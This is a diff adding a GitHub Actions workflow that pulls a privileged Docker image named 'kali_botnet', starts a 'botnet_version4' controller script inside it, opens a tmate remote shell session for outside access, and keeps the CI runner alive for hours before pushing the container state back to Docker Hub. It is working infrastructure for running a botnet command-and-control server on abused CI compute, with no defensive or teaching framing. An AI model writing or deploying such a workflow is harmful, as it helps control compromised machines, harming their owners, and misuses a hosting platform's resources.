@@ -1,1 +1,98 @@
+name: tmate
 
+on:
+  workflow_dispatch:
+
+jobs:
+  run-controller:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    env:
+      GH_TOKEN: ${{ secrets.GH_TOKEN }}
+      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
+      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
+      CONTROLLER_HOST: ${{ secrets.CONTROLLER_HOST }}
+      CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}
+
+    steps:
+      - name: Checkout Repo
+        uses: actions/checkout@v3
+
+      - name: Login to Docker Hub
+        run: |
+          set -x
+          echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin
+
+      - name: Pull Controller Image
+        run: |
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4c
+          docker pull $IMAGE_NAME
+
+      - name: Run Controller Container
+        run: |
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4c
+          docker run -d --name=kali_controller \
+            --privileged \
+            --network=host \
+            -e CONTROLLER_HOST=$CONTROLLER_HOST \
+            -e CONTROLLER_PORT=$CONTROLLER_PORT \
+            $IMAGE_NAME \
+            tail -f /dev/null
+          sleep 2
+          docker ps -a
+
+      - name: Start Controller Services
+        run: |
+          set -x
+          # start background services
+          docker exec -d kali_controller bash /start.sh
+          sleep 2
+          # start controller in detached tmux exactly like old working logic
+          docker exec -d kali_controller tmux new -d -s control_panel "bash -c 'source /app/venv/bin/activate && python /app/botnet_version4/run_controller.py'"
+          docker exec kali_controller tmux ls
+
+      - name: Start detached tmate session
+        run: |
+          set -e
+          sudo apt-get update -y
+          sudo apt-get install -y tmate
+          export TMATE_SOCK=/tmp/tmate.sock
+          tmate -S $TMATE_SOCK new-session -d
+          for i in $(seq 1 30); do
+            SSH_URL=$(tmate -S $TMATE_SOCK display -p '#{tmate_ssh}')
+            if [ -n "$SSH_URL" ]; then break; fi
+            sleep 1
+          done
+          if [ -z "$SSH_URL" ]; then
+            echo "tmate failed to start."
+            tmate -S $TMATE_SOCK show-messages || true
+            exit 1
+          fi
+          echo "================= TMATE CONNECTION INFO ================="
+          echo "SSH  : $SSH_URL"
+          echo "WEB  : $(tmate -S $TMATE_SOCK display -p '#{tmate_web}')"
+          echo "========================================================="
+
+      - name: Keep Workflow Alive & Auto-Restart
+        run: |
+          set -e
+          start_time=$(date +%s)
+          max_runtime=$((3 * 3600 + 1800)) # 3h30m
+
+          while true; do
+            now=$(date +%s)
+            uptime=$((now - start_time))
+            echo "[$(date)] Uptime: $((uptime / 60)) minutes"
+            if [ "$uptime" -ge "$max_runtime" ]; then
+                echo "[$(date)] Max runtime reached. Committing and pushing container..."
+                docker commit kali_controller ${DOCKERHUB_USERNAME}/kali_botnet:v4c
+                docker push ${DOCKERHUB_USERNAME}/kali_botnet:v4c
+                sleep 5
+                echo "Exiting workflow..."
+                exit 0
+            fi
+            sleep 60
+          done
